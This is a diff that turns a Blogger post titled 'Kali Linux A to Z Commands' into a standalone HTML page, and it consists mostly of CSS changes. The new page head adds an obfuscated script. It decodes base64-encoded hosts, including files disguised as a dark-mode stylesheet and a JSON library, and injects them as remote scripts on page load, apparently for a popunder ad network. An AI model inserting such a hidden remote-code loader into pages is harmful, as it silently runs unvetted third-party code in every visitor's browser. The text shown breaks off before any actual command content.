@@ -1,780 +1,1602 @@
-<!-- ===== KALI LINUX A TO Z COMMANDS - CYBERSUME FULL SCREEN BLACK EDITION ===== -->
-<!-- Isko Blogger Post Editor mein HTML mode mein paste karein -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <script type="text/javascript" data-cfasync="false">
+/*<![CDATA[/* */
+(function(){var v=window,q="e25514fe4b35f595db6750aa70f72f50",h=[["siteId",322*819*448+424-112824949],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],o=["d3d3LmludGVsbGlwb3B1cC5jb20vamRhcmttb2RlLWpzLm1pbi5jc3M=","ZDNtcjd5MTU0ZDJxZzUuY2xvdWRmcm9udC5uZXQvWC9yZmpzb24ubWluLmpz"],e=-1,d,s,k=function(){clearTimeout(s);e++;if(o[e]&&!(1816360970000<(new Date).getTime()&&1<e)){d=v.document.createElement("script");d.type="text/javascript";d.async=!0;var a=v.document.getElementsByTagName("script")[0];d.src="https://"+atob(o[e]);d.crossOrigin="anonymous";d.onerror=k;d.onload=function(){clearTimeout(s);v[q.slice(0,16)+q.slice(0,16)]||k()};s=setTimeout(k,5E3);a.parentNode.insertBefore(d,a)}};if(!v[q]){try{Object.freeze(v[q]=h)}catch(e){}k()}})();
+/*]]>/* */
+</script>
 
-<style>
-    /* ===== FULL SCREEN WRAPPER ===== */
-    .cyber-post-wrapper {
-        width: 100% !important;
-        max-width: 100% !important;
-        margin: 0 !important;
-        padding: 30px 40px 50px !important;
-        background: #000000 !important;
-        color: #ffffff;
-        border-radius: 0 !important;
-        box-sizing: border-box;
-    }
-    
-    /* ===== RESPONSIVE FULL SCREEN MARGINS ===== */
-    @media (max-width: 1200px) {
-        .cyber-post-wrapper {
-            padding: 25px 35px 45px !important;
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kali Linux Commands — Complete Reference Guide</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-    }
-    
-    @media (max-width: 992px) {
-        .cyber-post-wrapper {
-            padding: 22px 30px 40px !important;
+
+        html {
+            scroll-behavior: smooth;
         }
-    }
-    
-    @media (max-width: 768px) {
-        .cyber-post-wrapper {
-            padding: 18px 22px 35px !important;
+
+        body {
+            font-family: 'Outfit', -apple-system, sans-serif;
+            background: #000000;
+            background-image: 
+                radial-gradient(ellipse 80% 60% at 50% -20%, rgba(0, 255, 136, 0.08), transparent),
+                radial-gradient(ellipse 60% 50% at 100% 100%, rgba(0, 217, 255, 0.05), transparent);
+            background-attachment: fixed;
+            color: #ffffff;
+            min-height: 100vh;
+            line-height: 1.6;
+            -webkit-font-smoothing: antialiased;
+            padding: 0;
         }
-    }
-    
-    @media (max-width: 600px) {
-        .cyber-post-wrapper {
-            padding: 15px 18px 30px !important;
+
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 48px 32px 100px;
         }
-    }
-    
-    @media (max-width: 480px) {
-        .cyber-post-wrapper {
-            padding: 12px 14px 25px !important;
-        }
-    }
-    
-    /* ===== CONTENT MAX WIDTH ===== */
-    .cyber-content {
-        max-width: 1100px;
-        margin: 0 auto;
-        padding: 0;
-    }
-    
-    /* ===== POST HEADER ===== */
-    .post-header-cyber {
-        margin-bottom: 35px;
-        padding-bottom: 25px;
-        border-bottom: 1px solid rgba(0, 255, 136, 0.08);
-        background: transparent;
-    }
-    
-    .post-badge {
-        display: inline-block;
-        padding: 6px 26px;
-        background: rgba(0, 255, 136, 0.08);
-        border: 1px solid #00ff88;
-        border-radius: 50px;
-        color: #00ff88;
-        font-size: 13px;
-        text-transform: uppercase;
-        letter-spacing: 3px;
-        margin-bottom: 20px;
-    }
-    
-    .post-title-cyber {
-        font-size: 40px;
-        font-weight: 900;
-        line-height: 1.15;
-        color: #ffffff !important;
-        margin: 12px 0 18px;
-        letter-spacing: -0.5px;
-    }
-    
-    .post-title-cyber strong {
-        color: #00ff88;
-    }
-    
-    @media (max-width: 992px) {
-        .post-title-cyber {
-            font-size: 32px;
-        }
-    }
-    
-    @media (max-width: 768px) {
-        .post-title-cyber {
-            font-size: 26px;
-        }
-    }
-    
-    @media (max-width: 480px) {
-        .post-title-cyber {
-            font-size: 22px;
-        }
-    }
-    
-    /* ===== FEATURED BOX ===== */
-    .featured-box {
-        display: flex;
-        flex-wrap: wrap;
-        align-items: center;
-        gap: 35px;
-        background: #0a0a0a !important;
-        border: 1px solid rgba(0, 255, 136, 0.12);
-        border-radius: 18px;
-        padding: 32px 38px;
-        margin: 25px 0 38px;
-        justify-content: center;
-    }
-    
-    @media (max-width: 768px) {
-        .featured-box {
-            flex-direction: column;
+
+        /* ===== HEADER ===== */
+        .page-header {
             text-align: center;
-            padding: 25px 22px;
-            gap: 22px;
+            padding: 20px 0 48px;
+            position: relative;
+            margin-bottom: 48px;
         }
-    }
-    
-    @media (max-width: 480px) {
-        .featured-box {
-            padding: 20px 16px;
+
+        .page-header::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 140px;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #00ff88, transparent);
         }
-    }
-    
-    .featured-image {
-        flex-shrink: 0;
-    }
-    
-    .featured-image img {
-        max-width: 220px;
-        height: auto;
-        border-radius: 14px;
-        border: 2px solid #00ff88;
-        transition: 0.3s;
-        background: #000000;
-    }
-    
-    @media (max-width: 768px) {
-        .featured-image img {
-            max-width: 180px;
+
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 20px;
+            background: rgba(0, 255, 136, 0.05);
+            border: 1px solid rgba(0, 255, 136, 0.2);
+            border-radius: 100px;
+            color: #00ff88;
+            font-size: 12px;
+            font-weight: 600;
+            letter-spacing: 2.5px;
+            text-transform: uppercase;
+            margin-bottom: 24px;
+            backdrop-filter: blur(10px);
         }
-    }
-    
-    @media (max-width: 480px) {
-        .featured-image img {
-            max-width: 150px;
+
+        .badge .dot {
+            width: 6px;
+            height: 6px;
+            background: #00ff88;
+            border-radius: 50%;
+            box-shadow: 0 0 10px #00ff88;
+            animation: pulse 2s infinite;
         }
-    }
-    
-    .featured-image img:hover {
-        transform: scale(1.03);
-        box-shadow: 0 0 40px rgba(0, 255, 136, 0.15);
-    }
-    
-    .featured-cta {
-        flex: 1;
-        text-align: center;
-    }
-    
-    .featured-cta p {
-        color: #b0b8c8 !important;
-        margin: 5px 0 12px !important;
-        font-size: 16px;
-    }
-    
-    .featured-cta .main-link {
-        display: inline-block;
-        padding: 15px 42px;
-        background: linear-gradient(135deg, #00ff88, #00cc77);
-        color: #000000 !important;
-        border-radius: 10px;
-        font-weight: 700;
-        font-size: 16px;
-        text-decoration: none;
-        margin-top: 6px;
-        transition: all 0.3s ease;
-        letter-spacing: 0.5px;
-    }
-    
-    .featured-cta .main-link:hover {
-        transform: scale(1.04);
-        box-shadow: 0 0 35px rgba(0, 255, 136, 0.25);
-    }
-    
-    .featured-cta .small-note {
-        color: #6a7290 !important;
-        font-size: 13px;
-        margin-top: 12px !important;
-    }
-    
-    .price-tag {
-        display: inline-block;
-        padding: 4px 18px;
-        background: rgba(255, 204, 0, 0.1);
-        border: 1px solid #ffcc00;
-        border-radius: 50px;
-        color: #ffcc00;
-        font-size: 14px;
-        font-weight: 700;
-        margin-top: 8px;
-    }
-    
-    /* ===== HEADINGS ===== */
-    .cyber-post-wrapper h2 {
-        color: #ffffff !important;
-        font-size: 28px;
-        font-weight: 800;
-        margin-top: 40px;
-        margin-bottom: 18px;
-        border-left: 5px solid #00ff88;
-        padding-left: 20px;
-        line-height: 1.3;
-    }
-    
-    .cyber-post-wrapper h2#perfect {
-        border-left-color: #ffcc00;
-    }
-    
-    @media (max-width: 992px) {
-        .cyber-post-wrapper h2 {
-            font-size: 26px;
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.4; }
         }
-    }
-    
-    @media (max-width: 768px) {
-        .cyber-post-wrapper h2 {
-            font-size: 24px;
-            padding-left: 16px;
-            margin-top: 35px;
+
+        h1 {
+            font-size: clamp(34px, 5.5vw, 62px);
+            font-weight: 900;
+            line-height: 1.08;
+            letter-spacing: -0.03em;
+            margin-bottom: 18px;
+            background: linear-gradient(180deg, #ffffff 0%, #8892a8 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        h1 .highlight {
+            background: linear-gradient(135deg, #00ff88 0%, #00d9ff 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .subtitle {
+            color: #8892a8;
+            font-size: 17px;
+            font-weight: 300;
+            max-width: 660px;
+            margin: 0 auto 24px;
+        }
+
+        .meta-bar {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            flex-wrap: wrap;
+            margin: 24px 0 0;
+        }
+
+        .meta-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 18px;
+            background: rgba(10, 15, 25, 0.6);
+            border: 1px solid rgba(0, 255, 136, 0.1);
+            border-radius: 100px;
+            color: #8892a8;
+            font-size: 12.5px;
+            font-weight: 500;
+            backdrop-filter: blur(10px);
+        }
+
+        .meta-item .ico {
+            font-size: 14px;
+        }
+
+        .meta-item strong {
+            color: #00ff88;
+            font-family: 'JetBrains Mono', monospace;
+            font-weight: 700;
+        }
+
+        /* ===== TABLE OF CONTENTS ===== */
+        .toc {
+            background: linear-gradient(165deg, #0b0f18 0%, #060910 100%);
+            border: 1px solid rgba(0, 255, 136, 0.1);
+            border-radius: 20px;
+            padding: 26px 28px;
+            margin-bottom: 40px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .toc::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #00ff88, transparent);
+            opacity: 0.6;
+        }
+
+        .toc-title {
+            font-size: 14px;
+            font-weight: 700;
+            color: #00ff88;
+            letter-spacing: 2px;
+            text-transform: uppercase;
             margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
-    }
-    
-    @media (max-width: 480px) {
-        .cyber-post-wrapper h2 {
-            font-size: 20px;
-            padding-left: 14px;
-            margin-top: 28px;
+
+        .toc-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+            gap: 8px;
+            list-style: none;
+        }
+
+        .toc-list li a {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 10px 14px;
+            color: #b0b8c8;
+            text-decoration: none;
+            font-size: 14px;
+            border-radius: 10px;
+            border: 1px solid transparent;
+            transition: all 0.2s ease;
+        }
+
+        .toc-list li a:hover {
+            background: rgba(0, 255, 136, 0.05);
+            border-color: rgba(0, 255, 136, 0.15);
+            color: #00ff88;
+            transform: translateX(4px);
+        }
+
+        .toc-list li a .num {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            color: #00ff88;
+            background: rgba(0, 255, 136, 0.08);
+            padding: 2px 8px;
+            border-radius: 6px;
+            font-weight: 600;
+            flex-shrink: 0;
+        }
+
+        /* ===== SECTIONS ===== */
+        .section {
+            background: linear-gradient(165deg, #0b0f18 0%, #060910 100%);
+            border: 1px solid rgba(0, 255, 136, 0.08);
+            border-radius: 20px;
+            padding: 36px 34px;
+            margin-bottom: 26px;
+            position: relative;
+            overflow: hidden;
+            transition: border-color 0.3s ease;
+            scroll-margin-top: 20px;
+        }
+
+        .section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #00ff88, transparent);
+            opacity: 0.5;
+        }
+
+        .section:hover {
+            border-color: rgba(0, 255, 136, 0.2);
+        }
+
+        .section-number {
+            display: inline-block;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            font-weight: 700;
+            color: #00ff88;
+            background: rgba(0, 255, 136, 0.08);
+            border: 1px solid rgba(0, 255, 136, 0.15);
+            padding: 3px 10px;
+            border-radius: 6px;
+            letter-spacing: 1.5px;
+            margin-bottom: 12px;
+        }
+
+        .section-title {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            font-size: 25px;
+            font-weight: 800;
+            color: #ffffff;
+            margin-bottom: 20px;
+            letter-spacing: -0.02em;
+            line-height: 1.25;
+        }
+
+        .section-title .icon {
+            width: 48px;
+            height: 48px;
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+            background: linear-gradient(135deg, rgba(0, 255, 136, 0.12), rgba(0, 217, 255, 0.06));
+            border: 1px solid rgba(0, 255, 136, 0.15);
+            flex-shrink: 0;
+        }
+
+        h3 {
+            font-size: 18px;
+            font-weight: 700;
+            color: #00ff88;
+            margin: 24px 0 12px;
+            letter-spacing: -0.01em;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        h3::before {
+            content: '▸';
+            color: #00d9ff;
+            font-size: 16px;
+        }
+
+        h4 {
+            font-size: 15.5px;
+            font-weight: 600;
+            color: #ffffff;
+            margin: 18px 0 8px;
+        }
+
+        p {
+            color: #b0b8c8;
+            font-size: 15.5px;
+            line-height: 1.75;
             margin-bottom: 14px;
         }
-    }
-    
-    /* ===== PARAGRAPHS ===== */
-    .cyber-post-wrapper p {
-        color: #b0b8c8 !important;
-        font-size: 17px;
-        line-height: 1.95;
-        margin: 16px 0 20px;
-    }
-    
-    .cyber-post-wrapper p strong {
-        color: #00ff88;
-    }
-    
-    @media (max-width: 768px) {
-        .cyber-post-wrapper p {
-            font-size: 16px;
-            line-height: 1.85;
+
+        p:last-child {
+            margin-bottom: 0;
         }
-    }
-    
-    @media (max-width: 480px) {
-        .cyber-post-wrapper p {
+
+        strong {
+            color: #ffffff;
+            font-weight: 600;
+        }
+
+        em {
+            color: #00d9ff;
+            font-style: normal;
+            font-weight: 500;
+        }
+
+        a {
+            color: #00ff88;
+            text-decoration: none;
+            border-bottom: 1px dotted rgba(0, 255, 136, 0.4);
+            transition: all 0.2s ease;
+        }
+
+        a:hover {
+            color: #00d9ff;
+            border-bottom-color: #00d9ff;
+        }
+
+        /* ===== LISTS ===== */
+        ul, ol {
+            list-style: none;
+            margin: 12px 0;
+        }
+
+        ul li {
+            color: #b0b8c8;
             font-size: 15px;
+            padding: 10px 0 10px 32px;
+            position: relative;
+            line-height: 1.65;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+        }
+
+        ul li:last-child {
+            border-bottom: none;
+        }
+
+        ul li::before {
+            content: '▸';
+            position: absolute;
+            left: 8px;
+            color: #00ff88;
+            font-weight: 700;
+            font-size: 14px;
+        }
+
+        ol {
+            counter-reset: item;
+        }
+
+        ol li {
+            color: #b0b8c8;
+            font-size: 15px;
+            padding: 10px 0 10px 42px;
+            position: relative;
+            line-height: 1.65;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+            counter-increment: item;
+        }
+
+        ol li:last-child {
+            border-bottom: none;
+        }
+
+        ol li::before {
+            content: counter(item);
+            position: absolute;
+            left: 0;
+            top: 10px;
+            width: 26px;
+            height: 26px;
+            border-radius: 8px;
+            background: rgba(0, 255, 136, 0.08);
+            border: 1px solid rgba(0, 255, 136, 0.2);
+            color: #00ff88;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* ===== INLINE CODE ===== */
+        code {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            color: #00ff88;
+            background: rgba(0, 255, 136, 0.08);
+            padding: 2px 7px;
+            border-radius: 5px;
+            border: 1px solid rgba(0, 255, 136, 0.1);
+            font-weight: 500;
+        }
+
+        /* ===== CODE BLOCKS ===== */
+        .code-block {
+            background: #04060a;
+            border: 1px solid rgba(0, 255, 136, 0.12);
+            border-radius: 14px;
+            padding: 22px 24px;
+            margin: 18px 0;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            line-height: 1.75;
+            overflow-x: auto;
+            position: relative;
+        }
+
+        .code-block::before {
+            content: attr(data-lang);
+            position: absolute;
+            top: 10px;
+            right: 16px;
+            font-size: 10px;
+            color: #00ff88;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            font-weight: 700;
+            opacity: 0.5;
+        }
+
+        .code-block code {
+            color: #d4d4d4;
+            font-family: 'JetBrains Mono', monospace;
+            white-space: pre;
+            background: none;
+            border: none;
+            padding: 0;
+            font-size: 13px;
+        }
+
+        .cmt { color: #5a6478; font-style: italic; }
+        .cmd { color: #00ff88; font-weight: 500; }
+        .var { color: #00d9ff; }
+        .str { color: #ffd166; }
+        .kw  { color: #ff79c6; font-weight: 600; }
+        .num { color: #bd93f9; }
+
+        /* ===== CALLOUT ===== */
+        .callout {
+            background: rgba(0, 255, 136, 0.04);
+            border-left: 3px solid #00ff88;
+            border-radius: 0 12px 12px 0;
+            padding: 18px 22px;
+            margin: 20px 0;
+            color: #c8d0e0;
+            font-size: 14.5px;
+            line-height: 1.7;
+        }
+
+        .callout strong {
+            color: #00ff88;
+        }
+
+        .callout.warn {
+            background: rgba(255, 107, 107, 0.04);
+            border-left-color: #ff6b6b;
+        }
+
+        .callout.warn strong {
+            color: #ff6b6b;
+        }
+
+        .callout.info {
+            background: rgba(0, 217, 255, 0.04);
+            border-left-color: #00d9ff;
+        }
+
+        .callout.info strong {
+            color: #00d9ff;
+        }
+
+        /* ===== TABLE ===== */
+        .table-wrap {
+            overflow-x: auto;
+            margin: 18px 0;
+            border-radius: 14px;
+            border: 1px solid rgba(0, 255, 136, 0.1);
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 14px;
+            min-width: 520px;
+        }
+
+        thead {
+            background: rgba(0, 255, 136, 0.06);
+        }
+
+        th {
+            text-align: left;
+            padding: 14px 18px;
+            color: #00ff88;
+            font-weight: 700;
+            font-size: 12px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            border-bottom: 1px solid rgba(0, 255, 136, 0.15);
+        }
+
+        td {
+            padding: 13px 18px;
+            color: #b0b8c8;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+            line-height: 1.6;
+        }
+
+        tbody tr:last-child td {
+            border-bottom: none;
+        }
+
+        tbody tr:hover {
+            background: rgba(0, 255, 136, 0.02);
+        }
+
+        td code {
+            font-size: 12px;
+        }
+
+        /* ===== COMMAND CARDS GRID ===== */
+        .cmd-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+            gap: 14px;
+            margin: 20px 0 4px;
+        }
+
+        .cmd-card {
+            background: rgba(0, 255, 136, 0.03);
+            border: 1px solid rgba(0, 255, 136, 0.1);
+            border-radius: 14px;
+            padding: 18px 18px 16px;
+            transition: all 0.25s ease;
+        }
+
+        .cmd-card:hover {
+            border-color: rgba(0, 255, 136, 0.3);
+            background: rgba(0, 255, 136, 0.06);
+            transform: translateY(-3px);
+        }
+
+        .cmd-card .cmd-name {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 14px;
+            font-weight: 700;
+            color: #00ff88;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .cmd-card .cmd-name .ico {
+            font-size: 16px;
+        }
+
+        .cmd-card p {
+            font-size: 13px;
+            color: #8892a8;
+            line-height: 1.55;
+            margin: 0;
+        }
+
+        /* ===== FOOTER ===== */
+        .page-footer {
+            text-align: center;
+            padding: 48px 0 0;
+            margin-top: 40px;
+            border-top: 1px solid rgba(0, 255, 136, 0.08);
+            color: #4a5568;
+            font-size: 13px;
             line-height: 1.8;
-            margin: 14px 0 16px;
         }
-    }
-    
-    /* ===== LISTS ===== */
-    .cyber-post-wrapper ul,
-    .cyber-post-wrapper ol {
-        color: #b0b8c8 !important;
-        font-size: 17px;
-        line-height: 2.3;
-        padding-left: 0;
-        margin: 14px 0 22px;
-        list-style: none;
-    }
-    
-    .cyber-post-wrapper ul li,
-    .cyber-post-wrapper ol li {
-        color: #b0b8c8 !important;
-        margin-bottom: 4px;
-        padding-left: 28px;
-        position: relative;
-    }
-    
-    .cyber-post-wrapper ul li::before {
-        content: "▸";
-        color: #00ff88;
-        position: absolute;
-        left: 0;
-        font-weight: 700;
-        font-size: 18px;
-    }
-    
-    @media (max-width: 480px) {
-        .cyber-post-wrapper ul,
-        .cyber-post-wrapper ol {
-            font-size: 15px;
-            line-height: 2.1;
-        }
-        .cyber-post-wrapper ul li {
-            padding-left: 24px;
-        }
-    }
-    
-    /* ===== TWO COLUMN LIST ===== */
-    .two-col-list {
-        display: grid;
-        grid-template-columns: 1fr 1fr;
-        gap: 4px 40px;
-        padding-left: 0 !important;
-        list-style: none !important;
-        margin: 14px 0 22px;
-    }
-    
-    .two-col-list li {
-        color: #b0b8c8 !important;
-        font-size: 16.5px;
-        line-height: 2.2;
-        padding: 4px 0;
-        padding-left: 28px;
-        position: relative;
-    }
-    
-    .two-col-list li::before {
-        content: "▸";
-        color: #00ff88;
-        position: absolute;
-        left: 0;
-        font-weight: 700;
-    }
-    
-    @media (max-width: 768px) {
-        .two-col-list {
-            grid-template-columns: 1fr 1fr;
-            gap: 2px 20px;
-        }
-        .two-col-list li {
-            font-size: 15px;
-            padding-left: 24px;
-        }
-    }
-    
-    @media (max-width: 600px) {
-        .two-col-list {
-            grid-template-columns: 1fr;
-            gap: 2px;
-        }
-        .two-col-list li {
-            font-size: 15px;
-        }
-    }
-    
-    @media (max-width: 480px) {
-        .two-col-list li {
-            font-size: 14px;
-        }
-    }
-    
-    /* ===== THREE COLUMN LIST ===== */
-    .three-col-list {
-        display: grid;
-        grid-template-columns: 1fr 1fr 1fr;
-        gap: 4px 30px;
-        padding-left: 0 !important;
-        list-style: none !important;
-        margin: 14px 0 22px;
-    }
-    
-    .three-col-list li {
-        color: #b0b8c8 !important;
-        font-size: 15.5px;
-        line-height: 2.2;
-        padding: 4px 0;
-        padding-left: 28px;
-        position: relative;
-    }
-    
-    .three-col-list li::before {
-        content: "◆";
-        color: #00ff88;
-        position: absolute;
-        left: 0;
-        font-size: 12px;
-    }
-    
-    @media (max-width: 992px) {
-        .three-col-list {
-            grid-template-columns: 1fr 1fr;
-            gap: 2px 20px;
-        }
-        .three-col-list li {
-            font-size: 15px;
-        }
-    }
-    
-    @media (max-width: 600px) {
-        .three-col-list {
-            grid-template-columns: 1fr;
-            gap: 2px;
-        }
-        .three-col-list li {
-            font-size: 15px;
-            padding-left: 24px;
-        }
-    }
-    
-    @media (max-width: 480px) {
-        .three-col-list li {
-            font-size: 14px;
-        }
-    }
-    
-    /* ===== HORIZONTAL RULE ===== */
-    .cyber-post-wrapper hr {
-        border: none;
-        border-top: 1px solid rgba(0, 255, 136, 0.06);
-        margin: 30px 0 32px;
-        background: transparent;
-        height: 1px;
-    }
-    
-    /* ===== SHARE SECTION ===== */
-    .share-section {
-        margin-top: 50px;
-        padding-top: 30px;
-        border-top: 1px solid rgba(0, 255, 136, 0.08);
-    }
-    
-    .share-section p {
-        color: #6a7290 !important;
-        font-size: 15px;
-        text-align: center;
-        margin-bottom: 16px !important;
-    }
-    
-    .share-buttons {
-        display: flex;
-        gap: 16px;
-        justify-content: center;
-        flex-wrap: wrap;
-    }
-    
-    .share-buttons a {
-        padding: 12px 28px;
-        border: 1px solid rgba(0, 255, 136, 0.12);
-        border-radius: 10px;
-        color: #b0b8c8 !important;
-        text-decoration: none;
-        font-size: 15px;
-        font-weight: 500;
-        transition: 0.3s;
-        background: transparent;
-    }
-    
-    .share-buttons a:hover {
-        border-color: #00ff88;
-        color: #00ff88 !important;
-        background: rgba(0, 255, 136, 0.04);
-        transform: translateY(-2px);
-    }
-    
-    @media (max-width: 480px) {
-        .share-buttons a {
-            padding: 10px 18px;
-            font-size: 13px;
-        }
-        .share-section {
-            margin-top: 35px;
-            padding-top: 22px;
-        }
-    }
-    
-    /* ===== BOOK HIGHLIGHT BOX ===== */
-    .book-highlight {
-        background: linear-gradient(135deg, rgba(0, 255, 136, 0.05), rgba(0, 217, 255, 0.05));
-        border: 1px solid rgba(0, 255, 136, 0.1);
-        border-radius: 14px;
-        padding: 24px 30px;
-        margin: 20px 0 25px;
-        text-align: center;
-    }
-    
-    .book-highlight p {
-        margin: 5px 0 !important;
-        font-size: 16px;
-    }
-    
-    .book-highlight .highlight-title {
-        color: #00ff88;
-        font-weight: 700;
-        font-size: 18px;
-    }
-    
-    @media (max-width: 480px) {
-        .book-highlight {
-            padding: 18px 16px;
-        }
-        .book-highlight p {
-            font-size: 14px;
-        }
-        .book-highlight .highlight-title {
-            font-size: 16px;
-        }
-    }
-    
-    /* ===== TERMINAL POWER BOX ===== */
-    .terminal-power-box {
-        background: rgba(0, 255, 136, 0.03);
-        border: 1px solid rgba(0, 255, 136, 0.1);
-        border-radius: 14px;
-        padding: 20px 28px;
-        margin: 20px 0 25px;
-        text-align: center;
-    }
-    
-    .terminal-power-box .big-text {
-        color: #00ff88;
-        font-weight: 900;
-        font-size: 22px;
-        letter-spacing: 1px;
-        font-family: 'Courier New', monospace;
-    }
-    
-    .terminal-power-box p {
-        margin: 5px 0 !important;
-        font-size: 15px;
-    }
-    
-    @media (max-width: 480px) {
-        .terminal-power-box {
-            padding: 16px 16px;
-        }
-        .terminal-power-box .big-text {
-            font-size: 17px;
-        }
-        .terminal-power-box p {
-            font-size: 14px;
-        }
-    }
-    
-    /* ===== BLOGGER OVERRIDES ===== */
-    .blog-posts {
-        max-width: 100% !important;
-        padding: 0 !important;
-    }
-    
-    .post-body {
-        padding: 0 !important;
-        background: #000000 !important;
-    }
-    
-    .post-body-content {
-        background: #000000 !important;
-        padding: 0 !important;
-    }
-    
-    .post-outer {
-        background: #000000 !important;
-        padding: 0 !important;
-        margin: 0 !important;
-        border: none !important;
-        box-shadow: none !important;
-    }
-    
-    .post {
-        background: #000000 !important;
-        padding: 0 !important;
-        margin: 0 !important;
-        border: none !important;
-        box-shadow: none !important;
-    }
-    
-    /* ===== INLINE CODE ===== */
-    .cyber-post-wrapper code:not(pre code) {
-        background: #0a0a0a;
-        padding: 2px 12px;
-        border-radius: 4px;
-        color: #00ff88;
-        border: 1px solid rgba(0, 255, 136, 0.08);
-        font-size: 14.5px;
-        font-family: 'Courier New', monospace;
-    }
-    
-    @media (max-width: 480px) {
-        .cyber-post-wrapper code:not(pre code) {
-            font-size: 13px;
-            padding: 1px 8px;
-        }
-    }
-    
-    /* ===== IMAGES ===== */
-    .cyber-post-wrapper img {
-        max-width: 100%;
-        height: auto;
-        border-radius: 12px;
-        margin: 10px 0;
-        border: 1px solid rgba(0, 255, 136, 0.05);
-    }
-    
-    .separator {
-        clear: both;
-        text-align: center;
-    }
-    
-    /* ===== LINK STYLES ===== */
-    .cyber-post-wrapper a {
-        color: #00ff88;
-        text-decoration: none;
-        transition: 0.3s;
-    }
-    
-    .cyber-post-wrapper a:hover {
-        color: #00d9ff;
-        text-decoration: underline;
-    }
-    
-    .text-center {
-        text-align: center;
-    }
-    
-    .mt-10 {
-        margin-top: 10px;
-    }
-</style>
 
-<!-- ===== MAIN CONTENT ===== -->
-<div class="cyber-post-wrapper">
+        .page-footer .brand {
+            font-family: 'JetBrains Mono', monospace;
+            color: #00ff88;
+            font-weight: 700;
+            letter-spacing: 1px;
+        }
 
-    <div class="cyber-content">
+        .page-footer a {
+            border-bottom: none;
+        }
 
-        <!-- ===== POST HEADER ===== -->
-        <div class="post-header-cyber">
-            <div class="post-badge">💻 Kali Linux</div>
-            <h1 class="post-title-cyber">Kali Linux A to Z Commands</h1>
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 768px) {
+            .container { padding: 28px 18px 70px; }
+            .section { padding: 26px 22px; border-radius: 16px; }
+            .section-title { font-size: 20px; gap: 12px; }
+            .section-title .icon { width: 40px; height: 40px; font-size: 18px; }
+            h1 { font-size: 32px; }
+            .subtitle { font-size: 15px; }
+            .toc { padding: 20px 18px; }
+            .toc-list { grid-template-columns: 1fr; }
+            p { font-size: 14.5px; }
+            ul li { font-size: 14px; }
+            ol li { font-size: 14px; }
+            .code-block { font-size: 12px; padding: 16px 14px; }
+            .code-block code { font-size: 12px; }
+            h3 { font-size: 16px; }
+            .cmd-grid { grid-template-columns: 1fr; }
+        }
+
+        @media (max-width: 480px) {
+            .container { padding: 20px 12px 60px; }
+            h1 { font-size: 26px; }
+            .section { padding: 22px 16px; }
+            .section-title { font-size: 17px; }
+            .section-title .icon { width: 34px; height: 34px; font-size: 15px; }
+            .meta-bar { gap: 8px; }
+            .meta-item { font-size: 11px; padding: 6px 12px; }
+        }
+
+        /* Custom scrollbar */
+        ::-webkit-scrollbar { width: 8px; height: 8px; }
+        ::-webkit-scrollbar-track { background: #05080e; }
+        ::-webkit-scrollbar-thumb { background: #1a2a2a; border-radius: 20px; }
+        ::-webkit-scrollbar-thumb:hover { background: #00ff8833; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+
+    <!-- ===== HEADER ===== -->
+    <header class="page-header">
+        <div class="badge">
+            <span class="dot"></span>
+            CYBERSUME · COMMAND REFERENCE
         </div>
-
-        <!-- ===== INTRODUCTION ===== -->
-        <p>
-            Master Kali Linux one command at a time.
-        </p>
-        <p>
